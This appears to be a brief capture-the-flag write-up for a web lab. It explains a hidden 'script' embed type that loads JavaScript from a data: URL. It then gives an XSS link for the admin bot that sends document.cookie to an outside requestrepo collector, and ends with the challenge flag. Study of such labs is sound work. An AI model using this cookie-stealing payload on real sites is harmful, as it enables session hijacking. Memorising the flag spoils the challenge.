# Author's Note
```
@hossein
Sometimes there is more in the code than the UI shows you. The picker draws three embed types. The map behind it holds a fourth, and that one builds a <script>:

?type=script&url=data:text/javascript,alert(origin)
A data: URL is a file written inline: data:<mime>,<content>. With text/javascript the content is the script itself, so the src needs no host.
```

### link for admin
```
https://7f4c3d1645f0.pwnbox-lab.com/?url=data:text/javascript,fetch(`https://ux3s7632.requestrepo.com/leak?${document.cookie}`)&type=script
```

### flag
```
pwnbox{09d10503a970a8c9bdba10164fbac307}
```
